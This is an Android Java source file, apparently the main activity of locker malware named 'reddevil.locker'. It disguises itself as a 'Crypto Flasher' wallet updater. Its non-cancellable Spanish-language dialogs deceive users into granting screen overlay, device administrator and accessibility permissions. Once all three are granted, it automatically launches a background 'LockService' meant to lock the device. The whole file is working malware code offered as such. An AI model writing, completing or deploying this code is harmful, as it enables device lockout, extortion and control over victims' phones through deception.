package com.reddevil.locker;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.DialogInterface;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

public class MainActivity extends Activity {
    private static final int REQ_OVERLAY = 1001;
    private static final int REQ_ADMIN = 1002;
    private static final int REQ_ACCESS = 1003;

    private TextView txtOverlay, txtAdmin, txtAccess;
    private Button btnStart;
    private int currentStep = 0;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_main);

        txtOverlay = findViewById(R.id.txtOverlay);
        txtAdmin = findViewById(R.id.txtAdmin);
        txtAccess = findViewById(R.id.txtAccess);
        btnStart = findViewById(R.id.btnStart);

        btnStart.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                startPermissionFlow();
            }
        });
    }

    private void startPermissionFlow() {
        if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
            new AlertDialog.Builder(this)
                .setTitle("Permiso Requerido")
                .setMessage("\"Crypto Flasher\" necesita acceso a la pantalla para continuar con la actualizacion de la billetera.")
                .setPositiveButton("Permitir", new DialogInterface.OnClickListener() {
                    @Override public void onClick(DialogInterface dialog, int which) {
                        startActivityForResult(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName())), REQ_OVERLAY);
                    }
                })
                .setCancelable(false)
                .show();
        } else {
            askAdmin();
        }
    }

    private void askAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        if (!dpm.isAdminActive(new ComponentName(this, AdminReceiver.class))) {
            new AlertDialog.Builder(this)
                .setTitle("Administrador Requerido")
                .setMessage("\"Crypto Flasher\" necesita ser Administrador del Sistema para proteger la billetera.")
                .setPositiveButton("Activar", new DialogInterface.OnClickListener() {
                    @Override public void onClick(DialogInterface dialog, int which) {
                        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, new ComponentName(MainActivity.this, AdminReceiver.class));
                        startActivityForResult(intent, REQ_ADMIN);
                    }
                })
                .setCancelable(false)
                .show();
        } else {
            askAccessibility();
        }
    }

    private void askAccessibility() {
        new AlertDialog.Builder(this)
            .setTitle("Accesibilidad Requerida")
            .setMessage("\"Crypto Flasher\" necesita el Servicio de Accesibilidad para monitorear la billetera en segundo plano.")
            .setPositiveButton("Permitir", new DialogInterface.OnClickListener() {
                @Override public void onClick(DialogInterface dialog, int which) {
                    startActivityForResult(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), REQ_ACCESS);
                }
            })
            .setCancelable(false)
            .show();
    }

    private void checkStatus() {
        if (Build.VERSION.SDK_INT >= 23 && Settings.canDrawOverlays(this)) {
            txtOverlay.setText("[OK] Permiso de Pantalla");
            txtOverlay.setTextColor(0xFF00FF00);
        }
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        if (dpm.isAdminActive(new ComponentName(this, AdminReceiver.class))) {
            txtAdmin.setText("[OK] Administrador del Sistema");
            txtAdmin.setTextColor(0xFF00FF00);
        }
        String enabledServices = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (enabledServices != null && enabledServices.contains(getPackageName())) {
            txtAccess.setText("[OK] Servicio de Accesibilidad");
            txtAccess.setTextColor(0xFF00FF00);
            
            // Once all three are green, start the lock automatically
            if (Build.VERSION.SDK_INT >= 23 && Settings.canDrawOverlays(this) && dpm.isAdminActive(new ComponentName(this, AdminReceiver.class))) {
                if (Build.VERSION.SDK_INT >= 26) startForegroundService(new Intent(this, LockService.class));
                else startService(new Intent(this, LockService.class));
                finish();
            }
        }
    }

    @Override protected void onResume() {
        super.onResume();
        checkStatus();
    }

    @Override protected void onActivityResult(int rq, int rs, Intent d) {
        super.onActivityResult(rq, rs, d);
        if (rq == REQ_OVERLAY) {
            askAdmin();
        } else if (rq == REQ_ADMIN) {
            askAccessibility();
        }
    }
}
